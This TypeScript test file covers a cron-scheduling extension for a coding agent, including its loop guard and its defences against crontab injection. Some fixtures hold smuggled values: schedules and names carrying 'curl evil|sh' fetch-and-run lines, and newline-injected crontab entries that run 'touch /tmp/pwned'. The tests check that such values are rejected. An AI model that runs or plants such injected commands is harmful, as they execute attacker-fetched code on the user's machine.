import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import assert from "node:assert/strict";
import { EventEmitter } from "node:events";
import type { ChildProcess } from "node:child_process";
import { mkdtempSync, existsSync, readFileSync, readdirSync, writeFileSync, mkdirSync, utimesSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { nextFire, nextFires, validateSchedule } from "./lib/schedule.ts";
import {
  MAX_JOBS,
  THINKING_LEVELS,
  addJob,
  dueJobs,
  findJob,
  loadJobs,
  markFired,
  removeJob,
  saveJobs,
  setJobEnabled,
  setJobResult,
  type CronJob,
} from "./lib/jobs.ts";
import {
  cronEscape,
  childEnv,
  deliverFire,
  fireContent,
  GUARD_LINGER_MS,
  headlessArgs,
  isMutationRefused,
  isPinned,
  latestLog,
  readCronSettings,
  renderExport,
  renderList,
  runCronAction,
  runHeadless,
  shellQuote,
  tickOnce,
} from "./index.ts";

function tmpAgentDir(): string {
  return mkdtempSync(join(tmpdir(), "pi-cron-test-"));
}

function makeJob(over: Partial<CronJob> = {}): CronJob {
  return {
    name: "j",
    schedule: "0 9 * * mon",
    prompt: "do the thing",
    cwd: "/tmp",
    enabled: true,
    nextRun: 1,
    ...over,
  };
}

describe("schedule", () => {
  it("validates expressions", () => {
    assert.equal(validateSchedule("*/5 * * * *"), null);
    assert.equal(validateSchedule("0 9 * * mon"), null);
    assert.equal(typeof validateSchedule("* * *"), "string");
    assert.equal(typeof validateSchedule("not a cron"), "string");
    assert.equal(typeof validateSchedule("61 * * * *"), "string");
    assert.equal(typeof validateSchedule("* *"), "string");
  });

  it("computes monotonic fire times", () => {
    const from = new Date("2026-02-09T10:00:00");
    const fires = nextFires("*/15 * * * *", 5, from);
    assert.equal(fires.length, 5);
    for (let i = 1; i < fires.length; i++) {
      assert.ok(fires[i]!.getTime() > fires[i - 1]!.getTime());
    }
    assert.equal(fires[0]!.getMinutes() % 15, 0);
  });

  it("handles Feb 29", () => {
    const nf = nextFire("0 0 29 2 *", new Date("2026-02-10T00:00:00"))!;
    assert.equal(nf.getMonth(), 1); // February (0-indexed)
    assert.equal(nf.getDate(), 29);
    assert.ok(nf.getFullYear() > 2026);
  });

  it("matches restricted DOM or DOW (vixie OR semantics)", () => {
    // Fires on the 1st OR Sundays.
    const from = new Date("2026-02-09T00:00:00");
    for (const d of nextFires("0 0 1 * 0", 8, from)) {
      assert.ok(d.getDate() === 1 || d.getDay() === 0, `${d} is neither the 1st nor a Sunday`);
    }
  });
});

describe("jobs store", () => {
  it("adds, saves, and loads roundtrip", () => {
    const dir = tmpAgentDir();
    const job = addJob(dir, { name: "daily", schedule: "0 9 * * mon", prompt: "standup" }, 1_000);
    assert.equal(job.enabled, true);
    assert.equal(typeof job.nextRun, "number");
    const loaded = loadJobs(dir);
    assert.equal(loaded.length, 1);
    assert.equal(loaded[0]!.name, "daily");
    assert.equal(loaded[0]!.prompt, "standup");
  });

  it("refuses invalid input", () => {
    const dir = tmpAgentDir();
    assert.throws(() => addJob(dir, { name: "bad name!", schedule: "* * * * *", prompt: "p" }, 0), /name/i);
    assert.throws(() => addJob(dir, { name: "ok", schedule: "* *", prompt: "p" }, 0), /schedule/i);
    assert.throws(() => addJob(dir, { name: "ok", schedule: "* * * * *", prompt: "  " }, 0), /prompt/i);
    addJob(dir, { name: "a", schedule: "* * * * *", prompt: "p" }, 0);
    assert.throws(() => addJob(dir, { name: "a", schedule: "* * * * *", prompt: "p" }, 0), /exists/i);
  });

  it("enforces the job cap", () => {
    const dir = tmpAgentDir();
    for (let i = 0; i < MAX_JOBS; i++) {
      addJob(dir, { name: `j${i}`, schedule: "* * * * *", prompt: "p" }, 0);
    }
    assert.throws(() => addJob(dir, { name: "over", schedule: "* * * * *", prompt: "p" }, 0), /cap/i);
  });

  it("quarantines corrupt job files instead of crashing", () => {
    const dir = tmpAgentDir();
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "jobs.json"), "{not json");
    assert.deepEqual(loadJobs(dir), []);
    assert.ok(readdirSync(dir).some((f) => f.startsWith("jobs.corrupt-")));
  });

  it("filters jobs with shell metachars in schedule (hand-edited files)", () => {
    const dir = tmpAgentDir();
    mkdirSync(dir, { recursive: true });
    writeFileSync(
      join(dir, "jobs.json"),
      JSON.stringify({
        jobs: [
          { name: "evil", schedule: "* * * * * curl evil|sh #", prompt: "p", cwd: "/tmp", enabled: true, nextRun: 0 },
          { name: "good", schedule: "*/5 * * * *", prompt: "p", cwd: "/tmp", enabled: true, nextRun: 0 },
        ],
      }),
    );
    assert.deepEqual(
      loadJobs(dir).map((j) => j.name),
      ["good"],
    );
  });

  it("filters jobs with smuggled names, corrupt pins, bad status", () => {
    const dir = tmpAgentDir();
    mkdirSync(dir, { recursive: true });
    writeFileSync(
      join(dir, "jobs.json"),
      JSON.stringify({
        jobs: [
          // newline name would inject a live crontab line via the export comment
          { name: "x\n* * * * * curl evil.sh|sh", schedule: "* * * * *", prompt: "p", cwd: "/tmp", enabled: true, nextRun: 0 },
          { name: "bad pin", schedule: "* * * * *", prompt: "p", cwd: "/tmp", enabled: true, nextRun: 0, model: 42 },
          { name: "bad think", schedule: "* * * * *", prompt: "p", cwd: "/tmp", enabled: true, nextRun: 0, thinking: "maximum" },
          { name: "bad status", schedule: "* * * * *", prompt: "p", cwd: "/tmp", enabled: true, nextRun: 0, lastStatus: "exploded" },
          { name: "good", schedule: "* * * * *", prompt: "p", cwd: "/tmp", enabled: true, nextRun: 0, model: "opencode-go/glm-5.3-flash", thinking: "low", lastStatus: "ok" },
        ],
      }),
    );
    const jobs = loadJobs(dir);
    assert.deepEqual(jobs.map((j) => j.name), ["good"]);
    // no injected crontab lines possible from any loaded job
    assert.ok(!renderExport(jobs, join(tmpAgentDir(), "logs")).includes("evil"));
  });

  it("enable/disable: recomputes nextRun, unknown name throws, roundtrips", () => {
    const dir = tmpAgentDir();
    const now = Date.now();

    // unknown name
    assert.throws(() => setJobEnabled(dir, "nope", true, now), /No job named/);

    // parked job (markFired-style) → enable recomputes a real future nextRun
    addJob(dir, { name: "parked", schedule: "0 9 * * mon", prompt: "p" }, now);
    const jobs1 = loadJobs(dir);
    const parked = findJob(jobs1, "parked")!;
    parked.enabled = false;
    parked.nextRun = Number.MAX_SAFE_INTEGER;
    saveJobs(dir, jobs1);
    const reenabled = setJobEnabled(dir, "parked", true, now);
    assert.equal(reenabled.enabled, true);
    assert.ok(reenabled.nextRun > now, "nextRun recomputed to the future");
    assert.ok(reenabled.nextRun < Number.MAX_SAFE_INTEGER);

    // long-disabled job with stale past nextRun → next future occurrence, not immediate catch-up
    const staleAt = now - 21 * 24 * 3600_000; // disabled 3 weeks ago
    setJobEnabled(dir, "parked", false, now);
    const jobs2 = loadJobs(dir);
    findJob(jobs2, "parked")!.nextRun = staleAt;
    saveJobs(dir, jobs2);
    const resumed = setJobEnabled(dir, "parked", true, now);
    assert.ok(resumed.nextRun > now, "stale past nextRun not kept");
    // and it is not due right now (no surprise catch-up fire)
    assert.equal(dueJobs(loadJobs(dir), now).length, 0);

    // disable → excluded from dueJobs even when nextRun is in the past
    const jobs3 = loadJobs(dir);
    findJob(jobs3, "parked")!.nextRun = now - 1000;
    saveJobs(dir, jobs3);
    setJobEnabled(dir, "parked", false, now);
    assert.equal(dueJobs(loadJobs(dir), now).length, 0);
    assert.equal(loadJobs(dir)[0]!.enabled, false);
    // disable is idempotent-safe, enable of an enabled job is a no-op flag-wise
    const again = setJobEnabled(dir, "parked", true, now);
    assert.equal(again.enabled, true);
  });

  it("enable refuses schedules with no future fire time and stays disabled", () => {
    const dir = tmpAgentDir();
    // Feb 31 never exists → nextFire null (addJob would reject, so hand-craft
    // the parked job the way markFired parks a dead schedule)
    saveJobs(dir, [makeJob({ name: "never", schedule: "0 9 31 2 *", enabled: false, nextRun: Number.MAX_SAFE_INTEGER })]);
    assert.throws(() => setJobEnabled(dir, "never", true, Date.now()), /no future fire time/);
    const job = loadJobs(dir)[0]!;
    assert.equal(job.enabled, false);
    assert.equal(job.nextRun, Number.MAX_SAFE_INTEGER, "nextRun untouched on refused enable");
  });

  it("removes jobs and reports misses", () => {
    const dir = tmpAgentDir();
    addJob(dir, { name: "a", schedule: "* * * * *", prompt: "p" }, 0);
    assert.equal(removeJob(dir, "a"), true);
    assert.equal(removeJob(dir, "a"), false);
    assert.deepEqual(loadJobs(dir), []);
  });

  it("computes due jobs and catch-up advancement", () => {
    // nextRun in the past (pi was closed) → due once; markFired jumps past now.
    const job = makeJob({ nextRun: 1_000 });
    assert.equal(dueJobs([job], 5_000).length, 1);
    markFired(job, 5_000);
    assert.equal(job.lastRun, 5_000);
    assert.ok(job.nextRun > 5_000);
    assert.equal(dueJobs([job], 5_100).length, 0);
  });

  it("marks fired jobs with skipped intermediates", () => {
    // Every-minute job missed by 90 minutes → next fire is the coming minute, not 90 repeats.
    const job = makeJob({ schedule: "* * * * *", nextRun: Date.now() - 90 * 60_000 });
    markFired(job, Date.now());
    assert.ok(job.nextRun > Date.now());
    assert.ok(job.nextRun - Date.now() <= 60_000);
  });

  it("finds jobs", () => {
    const jobs = [makeJob({ name: "x" })];
    assert.equal(findJob(jobs, "x")?.name, "x");
    assert.equal(findJob(jobs, "nope"), undefined);
  });

  it("persists run results (ok/fail, truncated error, unknown name safe)", () => {
    const dir = tmpAgentDir();
    addJob(dir, { name: "a", schedule: "* * * * *", prompt: "p" }, 0);
    setJobResult(dir, "a", "ok");
    let job = loadJobs(dir)[0]!;
    assert.equal(job.lastStatus, "ok");
    assert.equal(job.lastError, undefined);
    setJobResult(dir, "a", "fail", "x".repeat(500));
    job = loadJobs(dir)[0]!;
    assert.equal(job.lastStatus, "fail");
    assert.equal(job.lastError?.length, 200);
    setJobResult(dir, "ghost", "ok"); // no crash
  });

  it("pins model and thinking (roundtrip + validation)", () => {
    const dir = tmpAgentDir();
    const job = addJob(
      dir,
      { name: "pinned", schedule: "* * * * *", prompt: "p", model: "zai-anthropic/glm-5.3-flash", thinking: "HIGH" },
      0,
    );
    assert.equal(job.model, "zai-anthropic/glm-5.3-flash");
    assert.equal(job.thinking, "high"); // normalized to lowercase
    const loaded = loadJobs(dir);
    assert.equal(loaded[0]!.model, "zai-anthropic/glm-5.3-flash");
    assert.equal(loaded[0]!.thinking, "high");
    assert.throws(
      () => addJob(dir, { name: "bad", schedule: "* * * * *", prompt: "p", thinking: "maximum" }, 0),
      /thinking/i,
    );
    assert.throws(() => addJob(dir, { name: "bad2", schedule: "* * * * *", prompt: "p", model: "  " }, 0), /[mM]odel/);
    assert.equal(THINKING_LEVELS.includes("high" as (typeof THINKING_LEVELS)[number]), true);
  });

  it("saves atomically (no tmp leftovers) and tolerates missing dir", () => {
    const dir = join(tmpAgentDir(), "nested", "cron");
    saveJobs(dir, [makeJob()]);
    assert.ok(readFileSync(join(dir, "jobs.json"), "utf8").includes('"jobs"'));
    assert.deepEqual(readdirSync(dir).filter((f) => f.startsWith(".jobs")), []);
    assert.ok(existsSync(dir));
  });
});

describe("guards and rendering", () => {
  it("refuses mutating actions within the linger window only", () => {
    const now = Date.now();
    for (const a of ["add", "remove", "run", "enable", "disable"]) {
      assert.equal(isMutationRefused(now, a, now), true);
      assert.equal(isMutationRefused(now - 1_000, a, now), true);
      assert.equal(isMutationRefused(now - GUARD_LINGER_MS, a, now), false, "window expired");
      assert.equal(isMutationRefused(0, a, now), false, "never armed");
    }
    for (const a of ["list", "test", "export", "logs"]) {
      assert.equal(isMutationRefused(now, a, now), false);
    }
  });

  it("fire message states the no-scheduling rule", () => {
    assert.ok(fireContent(makeJob()).includes("do not create, modify, or trigger cron jobs"));
    assert.ok(fireContent(makeJob()).includes("do the thing"));
  });

  it("renders an empty and a populated list", () => {
    assert.ok(renderList([]).includes("No cron jobs"));
    const text = renderList([makeJob({ name: "daily", lastRun: 1_000 })]);
    assert.ok(text.includes("daily"));
    assert.ok(text.includes("0 9 * * mon"));
    assert.ok(text.includes("enabled"));
  });

  it("renders run status in list", () => {
    const fail = renderList([makeJob({ name: "j", lastStatus: "fail", lastError: "exit 1: model not found" })]);
    assert.ok(fail.includes("[FAIL: exit 1: model not found]"));
    assert.ok(renderList([makeJob({ name: "j", lastStatus: "ok" })]).includes("[ok]"));
    assert.ok(!renderList([makeJob({ name: "j" })]).includes("[ok]"));
  });

  it("latestLog picks the newest log for a job only", () => {
    const logsDir = join(tmpAgentDir(), "logs");
    mkdirSync(logsDir, { recursive: true });
    writeFileSync(join(logsDir, "j-1.log"), "old");
    writeFileSync(join(logsDir, "j-2.log"), "new");
    writeFileSync(join(logsDir, "other-3.log"), "x");
    const oldMs = new Date("2026-01-01").getTime();
    const newMs = new Date("2026-01-02").getTime();
    utimesSync(join(logsDir, "j-1.log"), new Date(oldMs), new Date(oldMs));
    utimesSync(join(logsDir, "j-2.log"), new Date(newMs), new Date(newMs));
    assert.equal(latestLog(logsDir, "j")?.endsWith("j-2.log"), true);
    assert.equal(latestLog(logsDir, "nope"), undefined);
    assert.equal(latestLog(join(tmpAgentDir(), "missing"), "j"), undefined);
  });

  it("latestLog also finds export-installed crontab logs (name.log)", () => {
    const logsDir = join(tmpAgentDir(), "logs");
    mkdirSync(logsDir, { recursive: true });
    writeFileSync(join(logsDir, "daily-1.log"), "headless run");
    writeFileSync(join(logsDir, "daily.log"), "crontab run");
    const oldMs = new Date("2026-01-01").getTime();
    const newMs = new Date("2026-01-02").getTime();
    utimesSync(join(logsDir, "daily-1.log"), new Date(oldMs), new Date(oldMs));
    utimesSync(join(logsDir, "daily.log"), new Date(newMs), new Date(newMs));
    assert.equal(latestLog(logsDir, "daily")?.endsWith("daily.log"), true);
  });

  it("runHeadless survives jobs.json write failures (no host crash)", async () => {
    const { chmodSync } = await import("node:fs");
    const logsDir = join(tmpAgentDir(), "logs");
    const jobsDir = tmpAgentDir();
    mkdirSync(jobsDir, { recursive: true });
    writeFileSync(join(jobsDir, "jobs.json"), JSON.stringify({ jobs: [makeJob({ name: "pinned2", model: "m" })] }));
    chmodSync(jobsDir, 0o555); // reads ok, writes throw EACCES
    try {
      const state = { lastFireArmAt: 0 };
      const child = new EventEmitter() as unknown as ChildProcess;
      const parts = child as unknown as { stdout: EventEmitter; stderr: EventEmitter; kill: () => void };
      parts.stdout = new EventEmitter();
      parts.stderr = new EventEmitter();
      parts.kill = () => {};
      let delivered = false;
      const spawnFn = ((_cmd: string, _args: string[], _opts: unknown) => {
        setImmediate(() => {
          parts.stdout.emit("data", Buffer.from("HEADLESS_OK"));
          child.emit("close", 0);
        });
        return child;
      }) as unknown as typeof import("node:child_process").spawn;
      runHeadless(makeJob({ name: "pinned2", model: "m" }), {
        spawnFn,
        send: () => { delivered = true; },
        state,
        logsDir,
        jobsDir,
      });
      await new Promise((r) => setImmediate(r));
      assert.equal(delivered, true, "result still delivered when status write fails");
    } finally {
      chmodSync(jobsDir, 0o755);
    }
  });

  it("shell-quotes export lines", () => {
    assert.equal(shellQuote("it's here"), `'it'\\''s here'`);
    const logsDir = join(tmpAgentDir(), "logs");
    const text = renderExport([makeJob({ name: "daily", cwd: "/home/me" })], logsDir);
    assert.ok(text.includes("crontab"));
    assert.ok(text.includes("cd '/home/me'"));
    assert.ok(text.includes("pi -p --no-session"));
    assert.ok(text.includes(`>> '${logsDir}/daily.log' 2>&1`));
    assert.ok(text.includes("# job: daily"));
  });

  it("escapes crontab % in prompts, cwds, and log paths", () => {
    const text = renderExport(
      [makeJob({ name: "daily", cwd: "/home/50%", prompt: "run date +%F and report 50% done" })],
      join(tmpAgentDir(), "logs"),
    );
    assert.ok(text.includes("cd '/home/50\\%'"), "cwd % unescaped");
    assert.ok(text.includes("pi -p --no-session 'run date +\\%F and report 50\\% done'"), "prompt % unescaped");
    assert.ok(text.includes("daily.log' 2>&1"), "redirect intact");
  });

  it("skips export for jobs with newlines in prompt/cwd/model (crontab injection)", () => {
    const logsDir = join(tmpAgentDir(), "logs");
    const text = renderExport(
      [
        makeJob({ name: "promptnl", schedule: "0 9 * * mon", prompt: "ok\n* * * * * touch /tmp/pwned #" }),
        makeJob({ name: "cwdnl", schedule: "0 9 * * mon", cwd: "/tmp\n* * * * * touch /tmp/pwned2 #" }),
        makeJob({ name: "modelnl", schedule: "0 9 * * mon", model: "m\n* * * * * touch /tmp/pwned3 #" }),
        makeJob({ name: "clean", schedule: "0 9 * * mon" }),
      ],
      logsDir,
    );
    assert.equal(/^\* \* \* \* \* touch/m.test(text), false, "injected crontab line must not appear");
    assert.ok(text.includes("promptnl skipped"));
    assert.ok(text.includes("cwdnl skipped"));
    assert.ok(text.includes("modelnl skipped"));
    assert.ok(text.includes("# job: clean"));
    assert.ok(!text.split("\n").some((l) => l.startsWith("0 9 * * mon") && l.includes("pwned")));
  });

  it("creates the logs dir so installed crontab lines work on first run", () => {
    const logsDir = join(tmpAgentDir(), "nested", "logs");
    renderExport([makeJob()], logsDir);
    assert.ok(existsSync(logsDir));
  });

  it("delivers fires and arms the loop guard only on success (time-based)", () => {
    const job = makeJob();
    const ok = { lastFireArmAt: 0 };
    deliverFire(() => {}, ok, job);
    deliverFire(() => {}, ok, job);
    assert.ok(ok.lastFireArmAt > 0, "arm time recorded");
    assert.equal(isMutationRefused(ok.lastFireArmAt, "add"), true);

    const failed = { lastFireArmAt: 0 };
    deliverFire(() => { throw new Error("session gone"); }, failed, job);
    assert.equal(failed.lastFireArmAt, 0, "failed delivery must not arm the guard");
    assert.equal(isMutationRefused(failed.lastFireArmAt, "add"), false);
  });

  it("disables the scheduler in headless children via env", () => {
    assert.equal(childEnv().PI_CRON_DISABLED, "1");
  });

  it("runHeadless: captures output, logs it, delivers result, arms guard", async () => {
    const logsDir = join(tmpAgentDir(), "logs");
    const state = { lastFireArmAt: 0 };
    const sent: string[] = [];
    let capturedArgs: unknown[] = [];
    let capturedOpts: { env?: Record<string, string> } | undefined;
    const child = new EventEmitter() as unknown as ChildProcess;
    const parts = child as unknown as { stdout: EventEmitter; stderr: EventEmitter; kill: () => void };
    parts.stdout = new EventEmitter();
    parts.stderr = new EventEmitter();
    parts.kill = () => {};
    const spawnFn = ((_cmd: string, args: string[], opts: { env?: Record<string, string> }) => {
      capturedArgs = ["pi", ...args];
      capturedOpts = opts;
      setImmediate(() => {
        parts.stdout.emit("data", Buffer.from("HEADLESS_OK"));
        child.emit("close", 0);
      });
      return child;
    }) as unknown as typeof import("node:child_process").spawn;
    runHeadless(makeJob({ name: "pinned", model: "m", thinking: "low" }), {
      spawnFn,
      send: (_msg, _opts) => sent.push("delivered"),
      state,
      logsDir,
      jobsDir: tmpAgentDir(),
    });
    await new Promise((r) => setImmediate(r));
    assert.deepEqual(sent, ["delivered"]);
    assert.ok(state.lastFireArmAt > 0);
    assert.ok(capturedArgs.includes("--model") && capturedArgs.includes("m"));
    assert.ok(capturedArgs.includes("--thinking") && capturedArgs.includes("low"));
    assert.equal(capturedOpts?.env?.PI_CRON_DISABLED, "1", "child must run with scheduler disabled");
    const log = readFileSync(join(logsDir, readdirSync(logsDir)[0]!), "utf8");
    assert.ok(log.includes("HEADLESS_OK"));
  });

  it("runHeadless: escalates SIGTERM→SIGKILL and finishes with timeout error", async () => {
    const logsDir = join(tmpAgentDir(), "logs");
    const state = { lastFireArmAt: 0 };
    let delivered = "";
    const child = new EventEmitter() as unknown as ChildProcess;
    const kills: string[] = [];
    const spawnFn = ((_cmd: string, _args: string[], _opts: unknown) => {
      const parts = child as unknown as { kill: (sig?: string) => boolean };
      parts.kill = (sig) => {
        kills.push(sig ?? "");
        if (sig === "SIGKILL") setImmediate(() => child.emit("close", null, "SIGKILL"));
        return true;
      };
      return child;
    }) as unknown as typeof import("node:child_process").spawn;
    runHeadless(makeJob({ name: "slowpoke", model: "m" }), {
      spawnFn,
      send: (_msg, _opts) => { delivered = String((_msg as { content: string }).content); },
      state,
      logsDir,
      jobsDir: tmpAgentDir(),
      timeoutMs: 20,
      escalateMs: 20,
    });
    await new Promise((r) => setTimeout(r, 90));
    assert.ok(kills.includes("SIGTERM") && kills.includes("SIGKILL"), `kills: ${kills.join(",")}`);
    assert.ok(delivered.includes("timed out after 20ms"));
    assert.ok(state.lastFireArmAt > 0);
    const log = readFileSync(join(logsDir, readdirSync(logsDir)[0]!), "utf8");
    assert.ok(log.includes("[error] timed out"));
  });

  it("runHeadless: spawn error is logged and delivered without arming", async () => {
    const logsDir = join(tmpAgentDir(), "logs");
    const state = { lastFireArmAt: 0 };
    let delivered = "";
    const child = new EventEmitter() as unknown as ChildProcess;
    const spawnFn = (() => {
      setImmediate(() => child.emit("error", new Error("ENOENT: pi not found")));
      return child;
    }) as unknown as typeof import("node:child_process").spawn;
    runHeadless(makeJob({ name: "broken", model: "m" }), {
      spawnFn,
      send: (_msg, _opts) => { delivered = String((_msg as { content: string }).content); },
      state,
      logsDir,
      jobsDir: tmpAgentDir(),
    });
    await new Promise((r) => setImmediate(r));
    assert.ok(delivered.includes("failed to start"));
    assert.ok(delivered.includes("ENOENT"));
    assert.ok(state.lastFireArmAt > 0, "delivery still arms the guard (result was delivered)");
    const log = readFileSync(join(logsDir, readdirSync(logsDir)[0]!), "utf8");
    assert.ok(log.includes("[error] ENOENT"));
  });

  it("skips disabled jobs in export", () => {
    assert.ok(renderExport([makeJob({ enabled: false })], "/logs").includes("no enabled jobs"));
  });

  it("builds headless args and detects pins", () => {
    assert.deepEqual(headlessArgs({}), ["-p", "--no-session"]);
    assert.deepEqual(headlessArgs({ model: "z" }), ["-p", "--no-session", "--model", "z"]);
    assert.deepEqual(headlessArgs({ model: "m:high", thinking: "low" }), [
      "-p",
      "--no-session",
      "--model",
      "m:high",
      "--thinking",
      "low",
    ]);
    assert.deepEqual(headlessArgs({ thinking: "off" }), ["-p", "--no-session", "--thinking", "off"]);
    assert.equal(isPinned({}), false);
    assert.equal(isPinned({ model: "m" }), true);
    assert.equal(isPinned({ thinking: "low" }), true);
  });

  it("renders the pin in list and export", () => {
    const job = makeJob({ model: "zai-anthropic/glm-5.3-flash", thinking: "low" });
    assert.ok(renderList([job]).includes("pin: zai-anthropic/glm-5.3-flash:low"));
    const text = renderExport([job], join(tmpAgentDir(), "logs"));
    assert.ok(text.includes("--model 'zai-anthropic/glm-5.3-flash'"));
    assert.ok(text.includes("--thinking 'low'"));
  });
});

describe("tickOnce (scheduler wiring)", () => {
  it("fires due jobs exactly once and advances them", () => {
    const dir = tmpAgentDir();
    addJob(dir, { name: "a", schedule: "* * * * *", prompt: "p" }, 0);
    const fired: string[] = [];
    tickOnce({ dir, enabled: true, fire: (j) => fired.push(j.name), now: 70_000 });
    assert.deepEqual(fired, ["a"]);
    const job = loadJobs(dir)[0]!;
    assert.equal(job.lastRun, 70_000);
    assert.ok(job.nextRun > 70_000);
    tickOnce({ dir, enabled: true, fire: (j) => fired.push(j.name), now: 70_000 });
    assert.deepEqual(fired, ["a"], "second tick at the same instant must not re-fire");
  });

  it("disabled settings prevent firing", () => {
    const dir = tmpAgentDir();
    addJob(dir, { name: "a", schedule: "* * * * *", prompt: "p" }, 0);
    const fired: string[] = [];
    tickOnce({ dir, enabled: false, fire: (j) => fired.push(j.name), now: 10_000 });
    assert.deepEqual(fired, []);
    assert.equal(loadJobs(dir)[0]!.lastRun, undefined);
  });

  it("swallows fire() throws (timer safety)", () => {
    const dir = tmpAgentDir();
    addJob(dir, { name: "a", schedule: "* * * * *", prompt: "p" }, 0);
    assert.doesNotThrow(() =>
      tickOnce({
        dir,
        enabled: true,
        fire: () => { throw new Error("boom"); },
        now: 10_000,
      }),
    );
  });
});

describe("runCronAction (tool wiring)", () => {
  interface ActionOver {
    childMode?: boolean;
    send?: (...a: unknown[]) => void;
    fire?: (j: CronJob) => void;
  }
  function action(dir: string, state: { lastFireArmAt: number }, params: Record<string, unknown>, over: ActionOver = {}) {
    return runCronAction({
      dir,
      state,
      childMode: over.childMode ?? false,
      send: (over.send as never) ?? (() => {}),
      fire: over.fire ?? (() => {}),
      params: params as { action: string; name?: string; schedule?: string; prompt?: string; cwd?: string; model?: string; thinking?: string; enabled?: boolean },
      cwd: "/tmp",
    });
  }

  it("childMode refuses mutations but allows read-only actions", () => {
    const dir = tmpAgentDir();
    assert.throws(() => action(dir, { lastFireArmAt: 0 }, { action: "add", name: "x", schedule: "* * * * *", prompt: "p" }, { childMode: true }), /disabled in headless cron runs/);
    assert.throws(() => action(dir, { lastFireArmAt: 0 }, { action: "run", name: "x" }, { childMode: true }), /disabled in headless cron runs/);
    assert.throws(() => action(dir, { lastFireArmAt: 0 }, { action: "enable", name: "x" }, { childMode: true }), /disabled in headless cron runs/);
    assert.throws(() => action(dir, { lastFireArmAt: 0 }, { action: "disable", name: "x" }, { childMode: true }), /disabled in headless cron runs/);
    assert.ok(action(dir, { lastFireArmAt: 0 }, { action: "list" }, { childMode: true }).content[0]!.text.includes("No cron jobs"));
  });

  it("loop-guard window refuses mutations and expires", () => {
    const dir = tmpAgentDir();
    assert.throws(
      () => action(dir, { lastFireArmAt: Date.now() }, { action: "add", name: "x", schedule: "* * * * *", prompt: "p" }),
      /loop guard/,
    );
    const text = action(dir, { lastFireArmAt: Date.now() - GUARD_LINGER_MS - 1 }, { action: "add", name: "x", schedule: "* * * * *", prompt: "p" }).content[0]!.text;
    assert.ok(text.includes("'x' added"));
  });

  it("add enabled:false stores disabled; run hints enable; export skips; enable resumes", () => {
    const dir = tmpAgentDir();
    action(dir, { lastFireArmAt: 0 }, { action: "add", name: "d", schedule: "* * * * *", prompt: "p", enabled: false });
    const stored = loadJobs(dir)[0]!;
    assert.equal(stored.enabled, false);

    // run refused with an enable hint
    assert.throws(() => action(dir, { lastFireArmAt: 0 }, { action: "run", name: "d" }), /is disabled \(enable with/);

    // export skips disabled jobs
    const exportText = action(dir, { lastFireArmAt: 0 }, { action: "export" }).content[0]!.text;
    assert.ok(exportText.includes("(no enabled jobs)"));

    // enable → next fire reported, job runs
    const enableText = action(dir, { lastFireArmAt: 0 }, { action: "enable", name: "d" }).content[0]!.text;
    assert.ok(enableText.includes("'d' enabled. Next fire:"));
    assert.equal(loadJobs(dir)[0]!.enabled, true);
    const runText = action(dir, { lastFireArmAt: 0 }, { action: "run", name: "d" }).content[0]!.text;
    assert.ok(runText.includes("fired manually"));

    // disable again → run refused
    action(dir, { lastFireArmAt: 0 }, { action: "disable", name: "d" });
    assert.equal(loadJobs(dir)[0]!.enabled, false);
    assert.throws(() => action(dir, { lastFireArmAt: 0 }, { action: "run", name: "d" }), /is disabled/);

    // missing name
    assert.throws(() => action(dir, { lastFireArmAt: 0 }, { action: "enable" }), /name is required/);
    // unknown name
    assert.throws(() => action(dir, { lastFireArmAt: 0 }, { action: "enable", name: "nope" }), /No job named/);
  });

  it("add persists the job; run delivers and records ok/fail by delivery", () => {
    const dir = tmpAgentDir();
    action(dir, { lastFireArmAt: 0 }, { action: "add", name: "r", schedule: "* * * * *", prompt: "p" });

    // fire = the extension's unpinned fire path: deliver + persist by outcome
    const state = { lastFireArmAt: 0 };
    let sendImpl: (...a: Parameters<ExtensionAPI["sendMessage"]>) => void = () => {};
    const fire = (j: CronJob) => {
      const delivered = deliverFire((...a: Parameters<ExtensionAPI["sendMessage"]>) => sendImpl(...a), state, j);
      setJobResult(dir, j.name, delivered ? "ok" : "fail", delivered ? undefined : "delivery failed");
    };

    // successful delivery → [ok]
    action(dir, state, { action: "run", name: "r" }, { fire });
    assert.equal(loadJobs(dir)[0]!.lastStatus, "ok");

    // failed delivery → [fail: delivery failed] (guard linger expired by then)
    state.lastFireArmAt = Date.now() - GUARD_LINGER_MS - 1;
    sendImpl = () => { throw new Error("gone"); };
    action(dir, state, { action: "run", name: "r" }, { fire });
    const job = loadJobs(dir)[0]!;
    assert.equal(job.lastStatus, "fail");
    assert.equal(job.lastError, "delivery failed");
  });
});

describe("settings", () => {
  it("parses and clamps cron.timeoutMs for headless caps", () => {
    // isolate from the user's real settings (~/.pi/agent is a fallback dir)
    const empty = tmpAgentDir();
    const saved = process.env.PI_CODING_AGENT_DIR;
    process.env.PI_CODING_AGENT_DIR = empty;
    try {
      assert.equal(readCronSettings(tmpAgentDir()).timeoutMs, 600_000); // no settings file → default
    } finally {
      if (saved === undefined) delete process.env.PI_CODING_AGENT_DIR;
      else process.env.PI_CODING_AGENT_DIR = saved;
    }
    const dir = tmpAgentDir();
    mkdirSync(join(dir, ".pi"), { recursive: true });
    const write = (timeoutMs: unknown) =>
      writeFileSync(join(dir, ".pi", "settings.json"), JSON.stringify({ cron: { timeoutMs } }));
    write(7_200_000);
    assert.equal(readCronSettings(dir).timeoutMs, 7_200_000);
    write("junk");
    assert.equal(readCronSettings(dir).timeoutMs, 600_000); // non-numeric → default
    write(1_000);
    assert.equal(readCronSettings(dir).timeoutMs, 60_000); // clamped to 1 min floor
    write(99_999_999_999);
    assert.equal(readCronSettings(dir).timeoutMs, 86_400_000); // clamped to 24 h ceiling
  });
});
